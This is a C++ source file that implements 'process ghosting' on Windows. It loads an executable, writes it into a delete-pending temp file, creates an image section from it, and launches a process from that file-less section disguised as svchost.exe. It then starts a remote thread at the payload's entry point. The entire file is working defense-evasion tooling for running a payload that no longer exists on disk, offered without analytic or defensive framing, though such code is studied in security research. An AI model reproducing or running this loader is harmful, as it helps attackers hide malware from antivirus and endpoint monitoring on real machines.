#include "utils.h"
#include "process_ghosting.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>


BYTE* LoadExecutableBuffer(OUT size_t& bufferSize) {
	HANDLE fileHandle = CreateFileW(L"C:\\Users\\ethic\\Desktop\\Hacktivity\\Windows Exploit\\Resources\\injected.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to open executable file... \n");
		exit(-1);
	}
	bufferSize = GetFileSize(fileHandle, 0);
	BYTE* allocatedBuffer = (BYTE*)VirtualAlloc(0, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (allocatedBuffer == NULL) {
		perror("[-] Failed to allocate memory for executable buffer... \n");
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(fileHandle, allocatedBuffer, bufferSize, &bytesRead, NULL)) {
		perror("[-] Failed to read executable buffer... \n");
		exit(-1);
	}
	CloseHandle(fileHandle);
	return allocatedBuffer;
}


HANDLE CreateSectionFromPendingDeletion(wchar_t* filePath, BYTE* dataBuffer, size_t bufferSize) {
	HANDLE fileHandle;
	HANDLE sectionHandle;
	NTSTATUS ntStatus;
	_OBJECT_ATTRIBUTES objectAttributes;
	UNICODE_STRING unicodeFilePath;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	DWORD bytesWritten;

	// NT Functions Declaration
	_NtOpenFile fnNtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
	if (fnNtOpenFile == NULL) {
		perror("[-] Failed to locate NtOpenFile API...\n");
		exit(-1);
	}
	_RtlInitUnicodeString fnRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (fnRtlInitUnicodeString == NULL) {
		perror("[-] Failed to locate RtlInitUnicodeString API...\n");
		exit(-1);
	}
	_NtSetInformationFile fnNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
	if (fnNtSetInformationFile == NULL) {
		perror("[-] Failed to locate NtSetInformationFile API...\n");
		exit(-1);
	}
	_NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	if (fnNtCreateSection == NULL) {
		perror("[-] Failed to locate NtCreateSection API...\n");
		exit(-1);
	}

	fnRtlInitUnicodeString(&unicodeFilePath, filePath);
	InitializeObjectAttributes(&objectAttributes, &unicodeFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	wprintf(L"[+] Attempting to open the file...\n");

	// Open File
	ntStatus = fnNtOpenFile(&fileHandle, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		&objectAttributes, &ioStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to open the file...\n");
		exit(-1);
	}

	wprintf(L"[+] Setting file to delete-pending state...\n");
	// Set disposition flag
	FILE_DISPOSITION_INFORMATION fileDisposition = { 0 };
	fileDisposition.DeleteFile = TRUE;

	ntStatus = fnNtSetInformationFile(fileHandle, &ioStatusBlock, &fileDisposition, sizeof(fileDisposition), FileDispositionInformation);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to set file to delete-pending state...\n");
		exit(-1);
	}

	wprintf(L"[+] Writing data to delete-pending file...\n");
	// Write Payload To File
	if (!WriteFile(fileHandle, dataBuffer, bufferSize, &bytesWritten, NULL)) {
		perror("[-] Failed to write data to the file...\n");
		exit(-1);
	}

	wprintf(L"[+] Creating section from delete-pending file...\n");
	ntStatus = fnNtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, fileHandle);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to create section from delete-pending file...\n");
		exit(-1);
	}
	wprintf(L"[+] Section successfully created from delete-pending file.\n");

	// Close the delete-pending file handle
	CloseHandle(fileHandle);
	fileHandle = NULL;
	wprintf(L"[-] File successfully deleted from disk...\n");

	return sectionHandle;
}


HANDLE LaunchProcessFromSection(HANDLE sectionHandle) {
	HANDLE processHandle = INVALID_HANDLE_VALUE;
	NTSTATUS ntStatus;
	_NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");

	if (fnNtCreateProcessEx == NULL) {
		perror("[-] Failed to locate NtCreateProcessEx API...\n");
		exit(-1);
	}

	// Create Process with File-less Section
	ntStatus = fnNtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL,
		GetCurrentProcess(), PS_INHERIT_HANDLES, sectionHandle, NULL, NULL, FALSE);

	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to create the process...\n");
		exit(-1);
	}

	return processHandle;
}


ULONG_PTR RetrieveEntryPoint(HANDLE processHandle, BYTE* payloadBuffer, PROCESS_BASIC_INFORMATION processInfo) {
	BYTE imageBuffer[0x1000];
	ULONG_PTR entryPointAddress;
	SIZE_T bytesRead;
	NTSTATUS ntStatus;

	ZeroMemory(imageBuffer, sizeof(imageBuffer));

	// Function Declarations
	_RtlImageNTHeader fnRtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	if (fnRtlImageNTHeader == NULL) {
		perror("[-] Failed to locate RtlImageNtHeader API...\n");
		exit(-1);
	}
	_NtReadVirtualMemory fnNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	if (fnNtReadVirtualMemory == NULL) {
		perror("[-] Failed to locate NtReadVirtualMemory API...\n");
		exit(-1);
	}

	ntStatus = fnNtReadVirtualMemory(processHandle, processInfo.PebBaseAddress, &imageBuffer, sizeof(imageBuffer), &bytesRead);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to read remote process PEB base address...\n");
		exit(-1);
	}
	wprintf(L"[+] PEB Base Address of the target process: %p \n", (ULONG_PTR)((PPEB)imageBuffer)->ImageBaseAddress);

	entryPointAddress = (fnRtlImageNTHeader(payloadBuffer)->OptionalHeader.AddressOfEntryPoint);
	entryPointAddress += (ULONG_PTR)((PPEB)imageBuffer)->ImageBaseAddress;

	wprintf(L"[+] Calculated EntryPoint of the payload buffer: %p \n", entryPointAddress);

	return entryPointAddress;
}



BOOL ExecuteGhostProcess(BYTE* shellcode, size_t shellcodeSize) {
	NTSTATUS ntStatus;

	_NtQueryInformationProcess pQueryProcessInfo = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pQueryProcessInfo == NULL) {
		perror("[-] Failed to resolve NtQueryInformationProcess API.\n");
		exit(-1);
	}

	_RtlInitUnicodeString pInitUnicodeStr = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (pInitUnicodeStr == NULL) {
		perror("[-] Failed to resolve RtlInitUnicodeString API.\n");
		exit(-1);
	}

	_NtCreateThreadEx pCreateRemoteThread = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	if (pCreateRemoteThread == NULL) {
		perror("[-] Failed to resolve NtCreateThreadEx API.\n");
		exit(-1);
	}

	_NtWriteVirtualMemory pWriteMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (pWriteMemory == NULL) {
		perror("[-] Failed to resolve NtWriteVirtualMemory API.\n");
		exit(-1);
	}

	_NtAllocateVirtualMemory pAllocMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	if (pAllocMemory == NULL) {
		perror("[-] Failed to resolve NtAllocateVirtualMemory API.\n");
		exit(-1);
	}

	_RtlCreateProcessParametersEx pCreateProcParams = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	if (pCreateProcParams == NULL) {
		perror("[-] Failed to resolve RtlCreateProcessParametersEx API.\n");
		exit(-1);
	}

	HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
	HANDLE hMemorySection = INVALID_HANDLE_VALUE;
	DWORD procInfoLength;
	PROCESS_BASIC_INFORMATION procBasicInfo;
	ULONG_PTR epAddress;
	UNICODE_STRING unicodeTargetFile;
	PRTL_USER_PROCESS_PARAMETERS procParams;
	PEB* pRemotePEB;
	HANDLE hRemoteThread;
	UNICODE_STRING unicodeDllPath;
	wchar_t ntPath[MAX_PATH] = L"\\??\\";
	wchar_t tempFile[MAX_PATH] = { 0 };
	wchar_t tempDir[MAX_PATH] = { 0 };

	GetTempPathW(MAX_PATH, tempDir);
	GetTempFileNameW(tempDir, L"Panda", 0, tempFile);
	lstrcat(ntPath, tempFile);

	hMemorySection = CreateSectionFromPendingDeletion(ntPath, shellcode, shellcodeSize);
	if (hMemorySection == INVALID_HANDLE_VALUE) {
		perror("[-] Failed to create memory section.\n");
		exit(-1);
	}

	hTargetProcess = LaunchProcessFromSection(hMemorySection);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		perror("[-] Failed to create ghosted process.\n");
		exit(-1);
	}

	wprintf(L"[+] Ghosted process created successfully.\n");

	// Retrieve process information
	ntStatus = pQueryProcessInfo(hTargetProcess, ProcessBasicInformation, &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &procInfoLength);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to retrieve process information.\n");
		exit(-1);
	}

	// Retrieve entry point
	epAddress = RetrieveEntryPoint(hTargetProcess, shellcode, procBasicInfo);

	WCHAR targetPath[MAX_PATH];
	lstrcpyW(targetPath, L"C:\\windows\\system32\\svchost.exe");
	pInitUnicodeStr(&unicodeTargetFile, targetPath);

	// Create and configure process parameters
	wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING unicodeDllDir = { 0 };
	pInitUnicodeStr(&unicodeDllPath, dllDir);

	ntStatus = pCreateProcParams(&procParams, &unicodeTargetFile, &unicodeDllPath, NULL,
		&unicodeTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to create process parameters.\n");
		exit(-1);
	}

	// Allocate memory for process parameters in target process
	PVOID paramBuffer = procParams;
	SIZE_T paramSize = procParams->EnvironmentSize + procParams->MaximumLength;
	ntStatus = pAllocMemory(hTargetProcess, &paramBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(ntStatus)) {
		perror("[-] Failed to allocate memory for process parameters.\n");
		exit(-1);
	}

	printf("[+] Allocated memory for process parameters at %p.\n", paramBuffer);

	// Write process parameters into the target process
	ntStatus = pWriteMemory(hTargetProcess, procParams, procParams, procParams->EnvironmentSize + procParams->MaximumLength, NULL);

	pRemotePEB = (PEB*)procBasicInfo.PebBaseAddress;

	// Update the address of the process parameters in the target process's PEB
	if (!WriteProcessMemory(hTargetProcess, &pRemotePEB->ProcessParameters, &procParams, sizeof(PVOID), NULL)) {
		perror("[-] Failed to update process parameters in the target PEB.\n");
		exit(-1);
	}

	printf("[+] Updated process parameters address in the remote PEB.\n");

	// Create the thread to execute the ghosted process
	ntStatus = pCreateRemoteThread(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hTargetProcess,
		(LPTHREAD_START_ROUTINE)epAddress, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		std::cerr << "[-] Failed to create remote thread. NTSTATUS: " << std::hex << ntStatus << std::endl;
		exit(-1);
	}

	printf("[+] Remote thread created and executed.\n");

	return TRUE;
}


void processGhosting() {
	size_t bufferSize = 0;
	BYTE* buffer = LoadExecutableBuffer(bufferSize);
	BOOL success = ExecuteGhostProcess(buffer, bufferSize);
	system("pause");
}